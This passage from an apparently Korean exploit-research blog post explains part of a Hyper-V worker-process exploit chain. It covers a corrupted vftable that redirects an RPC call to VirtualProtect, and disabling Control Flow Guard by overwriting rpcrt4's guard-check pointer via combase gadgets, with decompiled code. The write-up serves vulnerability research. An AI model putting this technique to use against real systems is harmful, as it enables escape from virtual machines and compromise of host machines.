        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v33 == LRPC_SCALL::GetBuffer )
        {
          v34 = LRPC_SCALL::GetBuffer(v28, RpcMsg1, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64);
        }
        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
        {
          v34 = v33(v28, RpcMsg1, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64);        &lt;span class=&#34;hljs-comment&#34;&gt;// make corrupted vftable[0] + 0x70 points VirtualProtect in DispatchTable&lt;/span&gt;
        }
LABEL_56:
        v36 = v34;
LABEL_57:
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v30 &amp;amp;&amp;amp; v36 )
        {
          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (Microsoft_Windows_RPCEnableBits &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
            McTemplateU0q(v35, &amp;amp;RpcClientCallEndEvent, v36);
          &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)IsEEInfoEtwEnabled() )
            LogEEInfoToEtw();
        }
        &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_58;
      }
      v36 = &lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;;
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      v36 = &lt;span class=&#34;hljs-number&#34;&gt;0x6A6&lt;/span&gt;;
    }
LABEL_58:
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v36 )
    {
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( pStubMsg.pAsyncMsg &amp;amp;&amp;amp; pStubMsg.IsClient )
        *((_WORD *)pStubMsg.pAsyncMsg + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) |= &lt;span class=&#34;hljs-number&#34;&gt;8u&lt;/span&gt;;
      RpcRaiseException(v36);
    }
    pStubMsg.Buffer = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *)pStubMsg.RpcMsg-&amp;gt;Buffer;
    v37 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)pStubMsg._bf_c0;
    LODWORD(v37) = pStubMsg._bf_c0 | &lt;span class=&#34;hljs-number&#34;&gt;0x200&lt;/span&gt;;
    pStubMsg._bf_c0 |= &lt;span class=&#34;hljs-number&#34;&gt;0x200&lt;/span&gt;u;
    &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_60;
  }&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;v28&lt;/code&gt;&amp;#xC774; &amp;#xC870;&amp;#xC791;&amp;#xB41C; vftable&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xAC8C; &amp;#xB418;&amp;#xACE0; &amp;#xB9E4;&amp;#xC6B0; &amp;#xBCF5;&amp;#xC7A1;&amp;#xD574; &amp;#xBCF4;&amp;#xC774;&amp;#xB294; &amp;#xC870;&amp;#xAC74;&amp;#xC744; &amp;#xAC00;&amp;#xC9C4; if&amp;#xBB38;&amp;#xACFC; &amp;#xB9CC;&amp;#xB098;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBCF5;&amp;#xC7A1;&amp;#xD574; &amp;#xBCF4;&amp;#xC778;&amp;#xB2E4;&amp;#xACE0; &amp;#xADF8;&amp;#xB0E5; &amp;#xC870;&amp;#xAC74;&amp;#xC744; &amp;#xBB34;&amp;#xC2DC;&amp;#xD574;&amp;#xC11C; else&amp;#xB85C; &amp;#xBD84;&amp;#xAE30;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xBA74; &lt;code&gt;v36&lt;/code&gt;&amp;#xC774; 0x6a6&amp;#xC73C;&amp;#xB85C; &amp;#xC124;&amp;#xC815;&amp;#xB418;&amp;#xB294;&amp;#xB370;&amp;#xC694;? &amp;#xBC14;&amp;#xB85C; &amp;#xB2E4;&amp;#xC74C; if &amp;#xBB38;&amp;#xC744; &amp;#xBCF4;&amp;#xC2DC;&amp;#xBA74; &lt;code&gt;v36&lt;/code&gt;&amp;#xC774; 0&amp;#xC774; &amp;#xC544;&amp;#xB2C8;&amp;#xBA74; &amp;#xC584;&amp;#xC9E4; &amp;#xC5C6;&amp;#xC774; &lt;code&gt;RpcRaiseException&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; &amp;#xC608;&amp;#xC678;&amp;#xB97C; &amp;#xC5BB;&amp;#xC5B4;&amp;#xB9DE;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;del&gt;&lt;code&gt;NdrStubCall2&lt;/code&gt;: &amp;#xC790;&amp;#xC138;&amp;#xD788; &amp;#xC548; &amp;#xBCFC;&amp;#xAC70;&amp;#xC57C;? &amp;#x3147;&amp;#x314B;&amp;#x3147;&amp;#x314B; &amp;#xD130;&amp;#xC9C8;&amp;#xAC8C;&lt;/del&gt;&lt;br&gt;&amp;#xB2E4; &amp;#xB410;&amp;#xB2E4;&amp;#xACE0; &amp;#xC0DD;&amp;#xAC01;&amp;#xD55C; &amp;#xC2DC;&amp;#xC810;&amp;#xC5D0;&amp;#xC11C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xB97C; &amp;#xB9DE;&amp;#xACE0; &amp;#xB2E4;&amp;#xC2DC; &amp;#xD55C; &amp;#xBC88; &amp;#xC88C;&amp;#xC808;&amp;#xAC10;&amp;#xC744; &amp;#xB9DB; &amp;#xBCF8; &amp;#xC800;&amp;#xB294; &amp;#xC870;&amp;#xAC74;&amp;#xC744; &amp;#xB9DE;&amp;#xCDB0; &amp;#xC8FC;&amp;#xB824;&amp;#xACE0; &amp;#xAC00;&amp;#xC9DC; vftable&amp;#xC758; &amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xC5D4;&amp;#xD2B8;&amp;#xB9AC;&amp;#xB97C; 0x33307c89abcdef&amp;#xB85C; &amp;#xC124;&amp;#xC815;&amp;#xD574;&amp;#xC11C; if&amp;#xBB38;&amp;#xC73C;&amp;#xB85C; &amp;#xBD84;&amp;#xAE30;&amp;#xD558;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &lt;code&gt;NdrpServerUnMarshal&lt;/code&gt;&amp;#xB54C;&amp;#xCC98;&amp;#xB7FC; &lt;code&gt;v33 = *(__int64 (__fastcall **)(OSF_SCALL *__hidden, struct _RPC_MESSAGE *, struct _GUID *))(*(_QWORD *)v28 + 0x70i64);&lt;/code&gt;&amp;#xB85C; &amp;#xC5BB;&amp;#xC5B4;&amp;#xC9C4; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &lt;code&gt;VirtualProtect&lt;/code&gt;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4;&amp;#xC918; &lt;code&gt;v34 = v33(v28, RpcMsg1, 0i64);&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; 0&amp;#xC774; &amp;#xBC18;&amp;#xD658;&amp;#xB418;&amp;#xC5B4; &lt;code&gt;RpcRaiseException&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xD53C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xACE0; &lt;code&gt;NdrStubCall2&lt;/code&gt; &amp;#xBB34;&amp;#xC0AC;&amp;#xD788; &amp;#xBC18;&amp;#xD658;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026;&lt;/p&gt;
&lt;p&gt;&amp;#xC9C0;&amp;#xAE08;&amp;#xAE4C;&amp;#xC9C0; &lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xC744; &amp;#xBD84;&amp;#xC11D;&amp;#xD574;&amp;#xBCF4;&amp;#xBA70; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC784;&amp;#xC758;&amp;#xC758; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xC548;&amp;#xC804;&amp;#xD558;&amp;#xAC8C;(?) &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xC744; &amp;#xC54C;&amp;#xC544;&amp;#xBD24;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xACFC;&amp;#xC815;&amp;#xC744; &amp;#xC54C;&amp;#xC544;&amp;#xB0B4;&amp;#xAE30;&amp;#xAE4C;&amp;#xC9C0; &amp;#xC800;&amp;#xC758; &amp;#xAC00;&amp;#xC0C1;&amp;#xBA38;&amp;#xC2E0;&amp;#xC774; &amp;#xACAA;&amp;#xC5C8;&amp;#xC744; &amp;#xC218;&amp;#xB9CE;&amp;#xC740; &amp;#xC2A4;&amp;#xB0C5;&amp;#xC0F7; &amp;#xBCF5;&amp;#xC6D0;&amp;#xC5D0; &amp;#xB9C8;&amp;#xC74C;&amp;#xC774; &amp;#xC544;&amp;#xD504;&amp;#xB124;&amp;#xC694;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image3.png&#34; alt&gt;&lt;/p&gt;
&lt;h2 id=&#34;Neutralizing-CFG&#34;&gt;&lt;a href=&#34;#Neutralizing-CFG&#34; class=&#34;headerlink&#34; title=&#34;Neutralizing CFG&#34;&gt;&lt;/a&gt;Neutralizing CFG&lt;/h2&gt;&lt;p&gt;&amp;#xADF8;&amp;#xB798;&amp;#xC11C; &amp;#xC774;&amp;#xAC70;&amp;#xB85C; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; CFG&amp;#xB97C; &amp;#xC6B0;&amp;#xD68C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC744;&amp;#xAE4C;&amp;#xC694;?  &amp;#xBA3C;&amp;#xC800; &lt;code&gt;Invoke&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; CFG &amp;#xCCB4;&amp;#xD06C;&amp;#xB97C; &amp;#xC704;&amp;#xD574; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;RpcInvokeCheckICall&lt;/code&gt;&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC740;&amp;#xB370;&amp;#xC694;?&lt;br&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image4.png&#34; alt&gt;&lt;br&gt;&lt;code&gt;rpcrt4!__guard_check_icall_fptr&lt;/code&gt;&amp;#xC774; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xB9CC;&amp;#xC57D; &lt;code&gt;rpcrt4!__guard_check_icall_fptr&lt;/code&gt;&amp;#xC5D0; &amp;#xC4F0;&amp;#xAE30; &amp;#xAD8C;&amp;#xD55C;&amp;#xC744; &amp;#xBD80;&amp;#xC5EC;&amp;#xD558;&amp;#xACE0; &amp;#xBC14;&amp;#xB85C; &lt;code&gt;ret&lt;/code&gt; &amp;#xBA85;&amp;#xB839;&amp;#xC744; &amp;#xC218;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xB36E;&amp;#xC5B4;&amp;#xC4F4; &amp;#xB2E4;&amp;#xBA74; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xB420;&amp;#xAE4C;&amp;#xC694;? CFG&amp;#xAC00; &amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB294; &amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC9C0;&amp;#xB9CC; &lt;code&gt;ntdll!LdrpValidateUserCallTarget&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544; CFG&amp;#xAC00; &amp;#xC788;&amp;#xC73C;&amp;#xB098; &amp;#xB9C8;&amp;#xB098;&amp;#xC778; &amp;#xC0C1;&amp;#xD0DC;&amp;#xAC00; &amp;#xB418;&amp;#xC5B4;&amp;#xBC84;&amp;#xB9BD;&amp;#xB2C8;&amp;#xB2E4;!! &amp;#xB2E4;&amp;#xD589;&amp;#xD788; &lt;code&gt;VirtualProtect&lt;/code&gt;&amp;#xB294; &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C;&amp;#xC744; &amp;#xD558;&amp;#xB354;&amp;#xB77C;&amp;#xB3C4; CFG&amp;#xC5D0; &amp;#xAC78;&amp;#xB9AC;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC704; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574;&amp;#xC120; &amp;#xC801;&amp;#xC5B4;&amp;#xB3C4; &amp;#xC138; &amp;#xBC88;&amp;#xC758; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC740; &amp;#xD544;&amp;#xC694;&amp;#xD560; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB2E4;&amp;#xD589;&amp;#xD788; &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C;&amp;#xC744; &amp;#xBC18;&amp;#xBCF5;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xAC00;&amp;#xC82F;&amp;#xC774; &lt;code&gt;combase.dll&lt;/code&gt;&amp;#xC5D0; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
&lt;h2 id=&#34;Loop-Indirect-Call&#34;&gt;&lt;a href=&#34;#Loop-Indirect-Call&#34; class=&#34;headerlink&#34; title=&#34;Loop Indirect Call&#34;&gt;&lt;/a&gt;Loop Indirect Call&lt;/h2&gt;&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; &lt;code&gt;combase!RegistrationStore::Context&lt;/code&gt;&amp;#xC758; &lt;code&gt;RevertChanges&lt;/code&gt;&amp;#xB77C;&amp;#xB294; &amp;#xBA54;&amp;#xC18C;&amp;#xB4DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image5.png&#34; alt&gt;&lt;br&gt;&lt;code&gt;Context+0xb0&lt;/code&gt;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &lt;code&gt;_List_ENTRY&lt;/code&gt;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C4; &amp;#xC5F0;&amp;#xACB0;&amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB97C; &lt;code&gt;Blink&lt;/code&gt;&amp;#xBC29;&amp;#xD5A5;&amp;#xC73C;&amp;#xB85C; &amp;#xC21C;&amp;#xD68C;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; vftable+0x70&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xBC18;&amp;#xBCF5;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB97C; &amp;#xAD6C;&amp;#xC131;&amp;#xD558;&amp;#xB824;&amp;#xBA74; &amp;#xD799; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC54C;&amp;#xC544;&amp;#xC57C; &amp;#xD558;&amp;#xB294;&amp;#xB370; &amp;#xC774;&amp;#xB294; &lt;code&gt;VideoDirtListener + 0x58&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;VideoDirtListener&lt;/code&gt;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC5B4;&amp;#xC11C; &amp;#xC27D;&amp;#xAC8C; &amp;#xC54C;&amp;#xC544;&amp;#xB0BC; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &lt;code&gt;Blink&lt;/code&gt;&amp;#xAC00; &lt;code&gt;RPC_MESSAGE&lt;/code&gt;&amp;#xC758; &amp;#xB2E4;&amp;#xB978; &amp;#xC911;&amp;#xC694;&amp;#xD55C; &amp;#xD544;&amp;#xB4DC;&amp;#xC640; &amp;#xC624;&amp;#xD504;&amp;#xC14B;&amp;#xC774; &amp;#xACB9;&amp;#xCE58;&amp;#xC9C0; &amp;#xC54A;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0;&lt;br&gt;&amp;#xC5EC;&amp;#xB7EC; &amp;#xAC1C;&amp;#xC758; &amp;#xB178;&amp;#xB4DC;&amp;#xB4E4;&amp;#xB85C; &amp;#xC5F0;&amp;#xACB0;&amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB97C; &amp;#xAD6C;&amp;#xC131;&amp;#xD558;&amp;#xACE0; &amp;#xC774; &amp;#xAC00;&amp;#xC82F;&amp;#xC744; &amp;#xD65C;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &amp;#xAC01;&amp;#xAC01;&amp;#xC758; &amp;#xB178;&amp;#xB4DC;&amp;#xB4E4;&amp;#xC744; &amp;#xC21C;&amp;#xD68C;&amp;#xD558;&amp;#xBA70; &amp;#xC2A4;&amp;#xC2A4;&amp;#xB85C;&amp;#xB97C; &amp;#xC778;&amp;#xC790;(&lt;code&gt;RPC_MESSAGE&lt;/code&gt;)&amp;#xB85C; &amp;#xC0BC;&amp;#xC544; &lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &amp;#xAC01;&amp;#xAC01;&amp;#xC758; &amp;#xB178;&amp;#xB4DC;(&lt;code&gt;RPC_MESSAGE&lt;/code&gt;)&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xAC19;&amp;#xC740; &lt;code&gt;RPC_SERVER_INTERFACE&lt;/code&gt;&amp;#xC640; &lt;code&gt;MIDL_SERVER_INFO&lt;/code&gt;, &lt;code&gt;DispatchTable&lt;/code&gt;&amp;#xACFC; &lt;code&gt;vftable&lt;/code&gt;&amp;#xC744; &amp;#xACF5;&amp;#xC720;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5B4;&amp;#xC11C; &lt;del&gt;&amp;#xC2EC;&amp;#xAC01;&amp;#xD560; &amp;#xC815;&amp;#xB3C4;&amp;#xB85C;&lt;/del&gt; &amp;#xBCF5;&amp;#xC7A1;&amp;#xD574;&amp;#xC9C0;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;br&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xC774;&amp;#xC81C; &amp;#xC5B4;&amp;#xB5A4; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xB85C; CFG&amp;#xB97C; &amp;#xBB34;&amp;#xB825;&amp;#xD654;&amp;#xD560;&amp;#xC9C0; &amp;#xC54C;&amp;#xC544;&amp;#xBCF4;&amp;#xC2DC;&amp;#xC8E0;&lt;/p&gt;
&lt;h3 id=&#34;VirtualProtect&#34;&gt;&lt;a href=&#34;#VirtualProtect&#34; class=&#34;headerlink&#34; title=&#34;VirtualProtect&#34;&gt;&lt;/a&gt;&lt;code&gt;VirtualProtect&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;&amp;#xC815;&amp;#xB9D0; &amp;#xB2E4;&amp;#xD589;&amp;#xD788; &lt;code&gt;VirtualProtect&lt;/code&gt;&amp;#xB294; &amp;#xAC04;&amp;#xC811; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC5B4;&amp;#xB3C4; &amp;#xB418;&amp;#xB294; &amp;#xC720;&amp;#xD6A8;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xC600;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;code&gt;VirtualProtect(rpcrt4!_guard_check_icall_fptr, 8, PAGE_READWRITE, VALID_ADDRESS)&lt;/code&gt;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xD638;&amp;#xCD9C;&amp;#xC744; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xCF1C;&amp;#xC11C; &amp;#xBA3C;&amp;#xC800; &lt;code&gt;rpcrt4!__guard_check_icall_fptr&lt;/code&gt;&amp;#xC5D0; &amp;#xC4F0;&amp;#xAE30; &amp;#xAD8C;&amp;#xD55C;&amp;#xC744; &amp;#xBD80;&amp;#xC5EC;&amp;#xD569;&amp;#xC2DC;&amp;#xB2E4;&lt;/p&gt;
&lt;h3 id=&#34;combase-GenericStreamBase-lt-IStream-CoTaskMemAllocAllocator-gt-GetCopy&#34;&gt;&lt;a href=&#34;#combase-GenericStreamBase-lt-IStream-CoTaskMemAllocAllocator-gt-GetCopy&#34; class=&#34;headerlink&#34; title=&#34;combase!GenericStreamBase&amp;lt;IStream,CoTaskMemAllocAllocator&amp;gt;::GetCopy&#34;&gt;&lt;/a&gt;&lt;code&gt;combase!GenericStreamBase&amp;lt;IStream,CoTaskMemAllocAllocator&amp;gt;::GetCopy&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;&amp;#xC4F0;&amp;#xAE30; &amp;#xAC00;&amp;#xB2A5;&amp;#xD574;&amp;#xC9C4; &lt;code&gt;rpcrt4!__guard_check_icall_fptr&lt;/code&gt;&amp;#xC5D0; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC4F0;&amp;#xAE30; &amp;#xC704;&amp;#xD574; &amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778; &lt;code&gt;memcpy&lt;/code&gt; &amp;#xB4F1;&amp;#xC744; &amp;#xC4F0;&amp;#xBA74; CFG&amp;#xC5D0; &amp;#xC758;&amp;#xD574; vmwp&amp;#xAC00; &amp;#xC885;&amp;#xB8CC;&amp;#xB418;&amp;#xACE0; &amp;#xB9D9;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xB530;&amp;#xB77C;&amp;#xC11C; CFG&amp;#xC5D0; &amp;#xAC78;&amp;#xB9AC;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294; &lt;code&gt;combase!GenericStreamBase&amp;lt;IStream,CoTaskMemAllocAllocator&amp;gt;::GetCopy&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs C&#34;&gt;__int64 __fastcall GenericStreamBase&amp;lt;IStream,CoTaskMemAllocAllocator&amp;gt;::GetCopy(GenericStreamBase&amp;lt;IStream,AllocationWrapper&amp;gt; *&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8 *pBuff)
{
  memcpy_0(pBuff, (*&amp;amp;&lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;-&amp;gt;_cbDataSize + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;i64), &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt;-&amp;gt;_lOffset);
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image6.png&#34; alt&gt;&lt;br&gt;&amp;#xC778;&amp;#xC790;&amp;#xB85C; &lt;code&gt;this&lt;/code&gt;&amp;#xC640; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xBCF5;&amp;#xC0AC;&amp;#xB420; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xC778; &lt;code&gt;pBuff&lt;/code&gt;&amp;#xAC00; &amp;#xBCF4;&amp;#xC774;&amp;#xB294;&amp;#xB370;&amp;#xC694;? &lt;code&gt;this+0x14&lt;/code&gt;&amp;#xC758; 4&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD560; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xC758; &amp;#xBC14;&amp;#xC774;&amp;#xD2B8; &amp;#xC218;, &lt;code&gt;this+0x18&lt;/code&gt;&amp;#xC744; 8&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xB97C; &amp;#xBCF5;&amp;#xC0AC;&amp;#xB420; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC8FC;&amp;#xC18C;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;this&lt;/code&gt;&amp;#xAC00; &amp;#xC788;&amp;#xC9C4; &amp;#xD558;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC774; &amp;#xB610;&amp;#xD55C; &lt;code&gt;NdrServerCall2&lt;/code&gt;&amp;#xB85C; &amp;#xC870;&amp;#xC791;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xC5D0; &amp;#xBCF5;&amp;#xC0AC;&amp;#xB420; &amp;#xD06C;&amp;#xAE30;&amp;#xC640; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xD3EC;&amp;#xD568;&amp;#xC2DC;&amp;#xD0A4;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xAE30;&amp;#xB9CC; &amp;#xD558;&amp;#xBA74; &amp;#xB418;&amp;#xC8E0;. &amp;#xB0B4;&amp;#xBD80;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &lt;code&gt;memcpy&lt;/code&gt;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xBA70; &lt;code&gt;rpcrt4!__guard_check_icall_fptr&lt;/code&gt;&amp;#xC740; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC790;&amp;#xB9C8;&amp;#xC790; return&amp;#xD558;&amp;#xAC8C; &amp;#xB420; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. CFG&amp;#xB97C; &amp;#xBC14;&amp;#xBCF4;&amp;#xB85C; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4;&amp;#xBC84;&amp;#xB9AC;&amp;#xB294; &amp;#xAC70;&amp;#xC8E0;!&lt;/p&gt;
